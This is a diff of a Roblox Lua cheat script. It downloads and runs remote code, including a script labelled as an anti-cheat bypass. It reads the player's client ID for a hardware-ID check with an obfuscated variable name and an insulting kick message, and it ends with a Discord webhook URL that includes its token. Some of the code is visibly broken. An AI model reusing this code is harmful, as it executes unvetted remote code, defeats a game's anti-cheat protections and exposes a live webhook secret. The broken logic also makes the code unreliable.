@@ -2,14 +2,28 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
+while true do
+	task.wait(60)
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
+local WhitelistedHWIDs = {"."}
+local qNVAKkuwxNpqruLjSRHg = false
 
-local HWIDTable = loadstring(game:HttpGet("https://pastebin.com/raw/ypi12qV0"))()
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-print(HWIDTable)
-for i,v in pairs(HWIDTable) do
-if v == HWID then
-game.Players.LocalPlayer:Kick("Fat fuck you ain't supposed to be here lil bro")
+function CheckHWID(hwidval)
+for _,whitelisted in pairs(WhitelistedHWIDs) do
+ if hwidval == whitelisted then
+     return true
+ elseif hwidval ~= whitelisted then
+     return false
+       end
+    end
+end
 
+qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
+
+if qNVAKkuwxNpqruLjSRHg == true then
+ game.Players:Kick("L")
+end
+end
 
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
